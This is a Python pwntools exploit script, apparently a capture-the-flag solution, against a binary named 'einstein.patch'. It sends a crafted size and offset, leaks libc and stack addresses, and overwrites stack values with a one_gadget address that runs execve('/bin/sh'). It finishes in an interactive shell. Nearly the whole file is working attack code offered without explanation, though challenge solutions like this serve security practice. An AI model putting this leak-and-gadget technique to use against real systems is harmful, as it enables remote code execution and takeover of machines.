from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./einstein.patch"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process([vuln_path])
    # io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("", 9999)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


# size
io.sendlineafter(b'How long is your story ?\n', str(0x50000).encode())

# offset
io.sendlineafter(b"What's the distortion of time and space ?\n", str(0x2537b8).encode())

# data
io.sendafter(b'.\n', b'\xff')

leaks = io.recvuntil(b'Everything', drop=True)

leak = u64(leaks[5:][:8])
stack = u64(leaks[-63:][:8])
log.success("leak:-----> " + hex(leak))
libc.address = leak - 0x2008f0
log.success("libc.address:-----> " + hex(libc.address))
log.success("stack:-----> " + hex(stack))

"""
0xeb66b execve("/bin/sh", rbp-0x50, [rbp-0x78])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {"/bin/sh", rax, NULL} is a valid argv
  [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp
"""
one_gadget = libc.address + 0xeb66b
ddebug("b *handle+312\n")
io.sendlineafter("is it ???", "{p} {q}".format(p=stack-0x120, q=one_gadget))

io.sendline("{p} {q}".format(p=stack-0x118-0x78,q=0x0).encode())

io.interactive()
